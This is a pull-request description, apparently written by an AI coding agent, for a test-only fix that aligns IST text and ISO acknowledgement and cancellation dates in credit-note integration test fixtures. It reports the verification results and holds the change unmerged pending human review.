- **Scope:** `apps/server/test/credit-notes.integration.test.ts` only. Ports the 9aafaf0 pattern: an `istText()` helper renders the NIC portal's `DD/MM/YYYY HH:mm:ss` IST text from the same instant as the ISO value, applied to the `irpEvidence()` acknowledgement fixture and both `cancelInvoiceProvider` mocks.
- **Non-goals:** no production code, no route changes, no schema changes. The static dates in `whitebooks.test.ts`, `lifecycle.integration.test.ts`, and `finding47-provider-state.integration.test.ts` are deliberately untouched — 9aafaf0's sweep established they have no wall-clock dependence.

**Load-bearing analysis:** nothing compares the text forms today. The 24-hour cancel window SQL reads only `ack_date` (`apps/server/src/routes/credit-notes.ts` — `now() < cn.ack_date + interval '24 hours'`), and `ack_date_text` is stored and echoed verbatim into API responses and rendered HTML. So the suite was green despite the mismatch. The fix matters because the real Whitebooks adapter derives `ackDate` by parsing the portal's IST text (`indiaInstant()` in `apps/server/src/gsp/whitebooks.ts`), so a stub whose two forms disagree misrepresents the provider contract, and any future assertion or route logic touching the text would inherit the expired literal.

## Architecture / data / security impact

- [x] No schema impact
- [ ] Migration included and validated
- [ ] Tenant boundary reviewed
- [ ] Authorisation reviewed
- [ ] Audit behaviour reviewed
- [ ] Operations documentation updated

(Test-only change; the review checkboxes above are not applicable.)

## Verification

Run in a detached agent worktree against a fresh database `auto_mb_cnfix` on the local 5433 cluster (never the shared `auto_mb` database).

```text
# Targeted suite (fresh DB auto_mb_cnfix on 127.0.0.1:5433)
pnpm exec vitest run test/credit-notes.integration.test.ts
  Test Files  1 passed (1)
       Tests  15 passed (15)

# Full gate (same DB; AUTO_MB_PDFTOTEXT=C:\poppler\Library\bin\pdftotext.exe)
pnpm verify
  format:check, lint, typecheck, build: pass
  apps/server test:  Test Files  76 passed | 1 skipped (77)
                     Tests  1241 passed | 2 skipped (1243)
  db:check: validated 63 migration files
  architecture:check, config:check, security:secrets: pass
```

Note: the first full-verify attempt failed 49 PDF-signature/LOA tests with `PDF_TEXT_EXTRACTION_UNAVAILABLE` because Git-for-Windows' mingw64 ships Xpdf's same-named `pdftotext` ahead of Poppler on PATH in a bash shell. Setting `AUTO_MB_PDFTOTEXT` to the Poppler binary (as the error message itself instructs) resolved it; unrelated to this change.

## Evidence

- Fix pattern reference: commit 9aafaf0 ("Fix time-bomb ackDate fixture in tax-invoice IRP cancellation tests"), merged via PR #44.
- The three fixtures changed: `irpEvidence()` (ack), the tax-invoice cancel mock, and the CRN cancel mock — each now derives its text form and `rawResponse` `CancelDate` from the same `Date` instant as its ISO field.

## Rollback or mitigation

Revert the single commit. No data or deploy impact — test-only.

---

**Human review required:** per `CONTRIBUTING.md`, changes touching issued statutory documents' test paths (tax invoices / credit notes / IRP evidence) need fresh human review. This PR is left unmerged and held for that review.
